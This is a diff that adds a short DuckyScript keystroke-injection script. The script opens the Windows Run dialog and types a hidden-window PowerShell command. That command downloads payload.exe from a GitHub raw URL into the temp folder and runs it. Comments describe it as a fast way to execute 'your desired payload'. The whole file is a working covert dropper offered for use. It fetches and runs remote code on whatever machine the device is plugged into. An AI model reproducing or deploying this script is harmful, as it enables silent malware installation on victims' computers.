@@ -1,0 +1,8 @@
+REM Simple powershell oneliner that downloads your desired payload to temp and executes it. Execution tim is around 1/3 of a second. Replace link and output files to payload.
+DELAY 100
+GUI r
+DELAY 50
+REM Powershell command to download and execute desired payload in temp.
+STRING powershell -w h -c "iwr https://raw.githubusercontent.com/peroxic/repo/main/payload.exe -OutFile $env:TEMP\payload.exe; & $env:TEMP\payload.exe"
+DELAY 50
+ENTER
